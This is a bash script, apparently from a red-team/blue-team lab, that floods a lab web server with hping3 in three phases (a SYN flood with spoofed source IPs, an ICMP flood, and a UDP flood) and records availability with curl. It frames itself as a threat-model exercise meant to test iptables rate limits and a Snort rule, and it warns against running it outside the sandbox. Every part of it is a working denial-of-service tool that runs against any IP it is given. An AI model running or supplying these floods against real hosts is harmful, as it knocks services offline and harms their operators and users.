#!/bin/bash
# attack2_dos.sh - Denial-of-service flood against the victim's web server.
#
# Demonstrates 3 flood variants:
#   (a) TCP SYN flood with random source IPs (--rand-source)
#   (b) ICMP echo flood (tests anti-smurf / icmp rate limit)
#   (c) UDP flood against an unused port (tests catch-all FORWARD policy)
#
# Why this is in the threat model:
#   Availability attacks are the loudest, simplest way to disrupt a service.
#   The blue team's iptables `limit` and `recent` modules are specifically
#   designed to mitigate (a) and (b). (c) tests whether the default-deny
#   FORWARD chain catches traffic for which no explicit ALLOW exists.
#
# WARNING: This script ACTIVELY floods. Only run it inside the sandbox
# against the agreed lab IP. Do NOT run it against any other system.

source "$(dirname "$0")/config.sh"
require_root

OUT="$EVIDENCE_DIR/attack2_dos_$TIMESTAMP"
mkdir -p "$OUT"

banner "ATTACK 2 - DENIAL-OF-SERVICE FLOODS"
echo "Target host   : $VICTIM_IP"
echo "Evidence dir  : $OUT"
echo
warn "This script will flood the lab victim. Only run inside the sandbox."
echo "Press Ctrl-C within 5 seconds to abort..."
sleep 5

# --- Pre-attack baseline check ---------------------------------------------
step "Recording pre-attack baseline (HTTP response time)"
{
    echo "=== Pre-attack baseline ==="
    for i in 1 2 3; do
        curl -o /dev/null -s -w "Attempt $i: HTTP %{http_code}, %{time_total}s\n" \
             --max-time 5 "http://$VICTIM_IP/" || echo "Attempt $i: TIMEOUT"
    done
} | tee "$OUT/pre_baseline.txt"
echo

# --- (a) SYN flood ----------------------------------------------------------
step "Phase A: TCP SYN flood with spoofed source IPs (15 seconds)"
step "Watch: blue team's limit module should throttle, Snort SID 1000003 should alert."
( hping3 -S -p 80 --flood --rand-source "$VICTIM_IP" >/dev/null 2>&1 ) &
HPING_PID=$!
echo "hping3 PID: $HPING_PID" | tee "$OUT/a_syn_flood.txt"
sleep 15
kill -INT $HPING_PID 2>/dev/null
wait $HPING_PID 2>/dev/null
ok "SYN flood phase complete."
echo

# Mid-attack measurement
step "Measuring victim availability DURING flood window has now ended; checking recovery"
{
    echo "=== Post-SYN-flood recovery check ==="
    for i in 1 2 3; do
        curl -o /dev/null -s -w "Attempt $i: HTTP %{http_code}, %{time_total}s\n" \
             --max-time 5 "http://$VICTIM_IP/" || echo "Attempt $i: TIMEOUT"
    done
} | tee -a "$OUT/a_syn_flood.txt"
sleep 3
echo

# --- (b) ICMP flood ---------------------------------------------------------
step "Phase B: ICMP echo flood (10 seconds)"
( hping3 -1 --flood "$VICTIM_IP" >/dev/null 2>&1 ) &
HPING_PID=$!
echo "hping3 PID: $HPING_PID" > "$OUT/b_icmp_flood.txt"
sleep 10
kill -INT $HPING_PID 2>/dev/null
wait $HPING_PID 2>/dev/null
ok "ICMP flood phase complete."
echo

# --- (c) UDP flood to unused port -------------------------------------------
step "Phase C: UDP flood to closed port 31337 (5 seconds)"
( hping3 --udp -p 31337 --flood "$VICTIM_IP" >/dev/null 2>&1 ) &
HPING_PID=$!
echo "hping3 PID: $HPING_PID" > "$OUT/c_udp_flood.txt"
sleep 5
kill -INT $HPING_PID 2>/dev/null
wait $HPING_PID 2>/dev/null
ok "UDP flood phase complete."
echo

# --- Final availability check ----------------------------------------------
step "Recording post-attack availability"
{
    echo "=== Final availability ==="
    for i in 1 2 3; do
        curl -o /dev/null -s -w "Attempt $i: HTTP %{http_code}, %{time_total}s\n" \
             --max-time 5 "http://$VICTIM_IP/" || echo "Attempt $i: TIMEOUT"
    done
} | tee "$OUT/post_check.txt"
echo

ok "DoS attack complete. Evidence in: $OUT"
echo
echo "For your report, screenshot:"
echo "  - $OUT/pre_baseline.txt        (fast pre-attack response)"
echo "  - $OUT/a_syn_flood.txt         (degraded during flood, if defenses off)"
echo "  - $OUT/post_check.txt          (recovery after flood)"
echo "  - The blue team's Snort alert log (SID 1000003)"
echo "  - The blue team's iptables LOG output (FW-DROP entries)"
